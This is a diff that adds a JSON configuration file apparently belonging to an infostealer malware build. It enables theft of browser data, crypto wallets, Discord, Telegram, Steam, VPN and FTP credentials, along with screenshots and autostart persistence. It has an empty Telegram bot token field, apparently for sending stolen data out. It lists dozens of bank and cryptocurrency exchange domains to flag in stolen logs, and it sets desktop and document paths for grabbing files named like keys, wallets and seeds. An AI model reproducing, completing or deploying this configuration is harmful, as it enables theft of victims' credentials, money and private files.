@@ -1,0 +1,34 @@
+{
+  "AntiDuplicate": true,
+  "GrabFTP": true,
+  "GrabImClients": true,
+  "SaveAsJSON": false,
+  "GrabWallets": true,
+  "GrabVPN": true,
+  "BlockEmptyLogs": false,
+  "GrabSteam": true,
+  "GrabBrowsers": true,
+  "GrabDiscord": true,
+  "GrabFiles": true,
+  "GrabScreenshot": true,
+  "GrabTelegram": true,
+  "AutoStart": true,
+  "AutosaveDirectory": "",
+  "TelegramBotToken": "",
+  "DDPatterns": [
+    "BANKS=amegybank.com|associatedbank.com|ally.com|bankofthewest.com|bank7.com|barringtonbank.com|bbt.com|becu.org|beverlybank.com|bmoharris.com|bridgeviewbank.com|cffc.com|chase.com|citizensbank.com|classicbank.com|comerica.com|corebank.com|crystallakebank.com|dime.com|dollarbank.com|easternbank.com|53.com|finemarkbank.com|firstcommercebank.net|gorhamsavings.bank|happybank.com|hinsdalebank.com|lakeforestbank.com|libertyvillebank.com|mtb.com|emarquettebank.com|merchantsbankal.com|midwestone.com|morganstanley.com|macu.com|nbarizona.com|nsbank.com|northbrookbank.com|norrybank.com|oldplanktrailbank.com|pnc.com|onlinebanking.regions.com|renasantbank.com|rhinebeckbank.com|bankschaumburg.com|bankstcharles.com|sbotl.com|suntrust.com|tbkbank.com|tdbank.com|tiaabank.com|townbank.us|umpquabank.com|vectrabank.com|villagebankonline.bank|wheatonbank.com|wintrustbank.com|zionsbank.com",
+    "MONEY=yobit.net|freebitco.in|zb.com|binance.com|huobi.com|okex.com|hitbtc.com|bitfinex.com|kraken.com|bitstamp.net|payoneer.com|bittrex.com|gate.io|exmo.com|yobit.io|bitflyer.com|poloniex.com|kucoin.com|coinone.co.kr|livecoin.net|mercatox.com|localbitcoins.com|korbit.co.kr|cex.io|luno.com|rocktrading.com|etherdelta.com|bleutrade.com|anxpro.com|c-cex.com|gatecoin.com|bitkonan.com|jubi.com|koinex.in|koineks.com|kuna.io|koinim.com|kiwi-coin.com|leoxchange.com|lykke.com|magnr.com|localtrade.cc|lbank.info|itbit.com|litebit.eu|liqui.io|ecoin.cc|indx.ru|fybse.se|freiexchange.com|fybsg.com|wildbitcoin.com|betchain.com|ethexindia.com|litecoinlocal.net|gemini.com|gdax.com|gatehub.net|satoshitango.com|foxbit.com.br|flowbtc.com.br|exx.com|exrates.me|excambriorex.com|ezbtc.ca|fargobase.com|fcce.jp|getbtc.org|glidera.io|indacoin.com|igot.com|idex.market|independentreserve.com|mercadobitcoin.com.br|infinitycoin.exchange|ice3x.co.za|guldentrader.com|heatwallet.com|hypex.nl|isx.ca|negociecoins.com.br|tradesatoshi.com|topbtc.com|tidex.com|mydicewallet.com|tuxexchange.com|usd-x.com|urdubit.com|tidebit.com|tdax.com|stex.com|stellarterm.com|spacebtc.com|surbitcoin.com|buda.com|xbtce.com|yunbi.com|zyado.com|trade.z.com|zaif.jp|wavesplatform.com|vircurex.com|vbtc.exchange|vaultoro.com|coinmarketcap.com|vwlpro.com|walltime.info|southxchange.com|shapeshift.io|nocks.com|nlexch.com|novaexchange.com|mynxt.info|nzbcx.com|nevbit.com|mixcoins.com|mr.exchange|neraex.pro|dsx.uk|okcoin.com|liquid.com|quoine.com|quadrigacx.com|rightbtc.com|rippex.net|ripplefox.com|qryptos.com|ore.bz|openledger.info|omnidex.io|paribu.com|paymium.com|dcexchange.ru|dcexe.com|bitmex.com|funpay.ru|bitmaszyna.pl|bitonic.nl|bitpanda.com|bitsblockchain.net|bitmarket.net|bitlish.com|bitfex.trade|blockchain.com|blockchain.info|bitexbook.com|bitexbook.com|bitflip.cc|bitgrail.com|bitkan.com|bitinka.com|bitholic.com|bitsane.com|cryptofresh.com|btcmarkets.net|braziliex.com|btc-trade.com.ua|btc-alpha.com|btc38.com|btc100.com|bl3p.eu|bitssa.com|bitspark.io|bitso.com|bitstar|bittylicious.com|altcointrader.co.za|arenabitcoin.com|allcoin.com|796.com|abucoins.com|aidosmarket.com|aex.com|acx.io|bancor.network|bitbay.net|indodax.com|bitcoin.de|bitcointrade.com|bitcointoyou.com|bitbanktrade.jp|coinmarketcap.com|big.one|bcex.ca|bitconnect.co|bisq.network|bit2c.co.il|bit-z.com|btcbear.com|btcbox.co.jp|xcpdex.com|coss.io|coolcoin.com|crex24.com|cryptex.net|coinut.com|coinsbank.com|coinsecure.in|coinsquare.com|coinspot.io|coinsmarkets.com|crypto-bridge.org|dcex.com|dabtc.com|decentrex.com|deribit.com|dgtmarket.com|cryptomkt.com|cryptoderivatives.market|cryptodao.com|cryptomate.co.uk|cryptox.pl|cryptopia.co.nz|coinroom.com|coinrate.net|chbtc.com|chilebit.net|coinbase.com|bx.in.th|burstnation.com|btcc.com|btc-trade.com.ua|btcturk.com|btcxindia.com|bt.cx|coincheck.com|coinmate.io|coingi.com|coinnest.co.kr|coinrail.co.kr|coinpit.io|coingather.com|coinfloor.co.uk|coinegg.com|coincorner.com|coinexchange.io|coinfalcon.com|digatrade|100bitcoins.com|1broker.com|bitmakler.com|rcsb.org|alcurex|allcrypt|alt2bit|altquick|altstrade|arcticcoin|atomictrade|banx|bit-x|bitbays|bitchanger|bitcoinupbit|bitcurex|bitebi9|bitok|bitport|bitquick|bityes|bl-btcltc|btc-e|btcig|btcpx|bter|cavirtex|ccedk|ccnex|clevercoin|coinano|coinbroker|coinedup|coinex|coinexgateway|coinmkt|coinnext|coinport|coins-e|coinsave|coinsetter|comkort|crypthal|cryptorush|crypto-trade|cryptoave|cryptonit|cryptsy|d.a.s.exchange|dextrade|dgex|emebtc|empoex|finccx|fxbtc|go-trade|goc.io|haobtc|icbtrade|justcoin|lakebtc|lazycoins|litetree|loyalbit|lzf|masterxchange|mcoin.io|mcxnow|mercury|metaexchange|mintpal|mt.gox|netagio|nix-e|nxt-e|nxtchg|okcoincn|palth|prelude|qex|safecex|secureae|swisscex|ua-bit|usecryptos|freebitco.in|freewallet.org|waveswallet.io|dogechain.info|minergate.com|vaultofsatoshi|virwox|wbe|wex|onecoin.eu|yuanbaohui.com|coinloan.club|qiwi.com",
+    "PayPal=paypal.com",
+    "Amazon=amazon.com",
+    "GPay=pay.google.com",
+    "BusFB=business.facebook.com"
+  ],
+  "BlacklistedHWID": [],
+  "BlacklistedCountry": [],
+  "BlackListedIPS": [],
+  "GrabPaths": [
+    "%userprofile%\\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0",
+    "%userprofile%\\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0"
+  ],
+  "BlackListedBuilds": []
+}
